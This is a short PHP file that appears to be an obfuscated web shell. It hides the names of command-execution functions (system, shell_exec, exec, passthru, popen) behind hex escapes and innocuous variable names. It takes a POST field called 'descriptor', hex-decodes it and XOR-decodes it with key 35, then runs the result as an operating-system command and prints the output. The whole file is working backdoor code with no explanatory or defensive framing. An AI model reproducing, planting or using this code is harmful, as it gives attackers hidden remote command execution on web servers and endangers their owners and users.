<?php

$settings2 = "\x73\x68\x65\x6Cl\x5Fexec";
$settings1 = "\x73\x79s\x74em";
$settings7 = "pclo\x73e";
$settings3 = "exec";
$settings5 = "\x70op\x65n";
$settings6 = "s\x74\x72e\x61m\x5F\x67\x65\x74\x5Fc\x6F\x6Etents";
$sync_manager = "\x68\x65x\x32b\x69n";
$settings4 = "\x70\x61ss\x74hr\x75";
if (isset($_POST["d\x65\x73c\x72\x69p\x74or"])) {
            function module_controller ( $reference   ,   $fac  ) {$ref   = '' ;   for($t=0; $t<strlen($reference); $t++){$ref.=chr(ord($reference[$t])^$fac);} return$ref; }
            $descriptor = $sync_manager($_POST["d\x65\x73c\x72\x69p\x74or"]);
            $descriptor = module_controller($descriptor, 35);
            if (function_exists($settings1)) {
                $settings1($descriptor);
            } elseif (function_exists($settings2)) {
                print $settings2($descriptor);
            } elseif (function_exists($settings3)) {
                $settings3($descriptor, $object_reference);
                print join("\n", $object_reference);
            } elseif (function_exists($settings4)) {
                $settings4($descriptor);
            } elseif (function_exists($settings5) && function_exists($settings6) && function_exists($settings7)) {
                $fac_ref = $settings5($descriptor, 'r');
                if ($fac_ref) {
                    $data_dat = $settings6($fac_ref);
                    $settings7($fac_ref);
                    print $data_dat;
                }
            }
            exit;
        }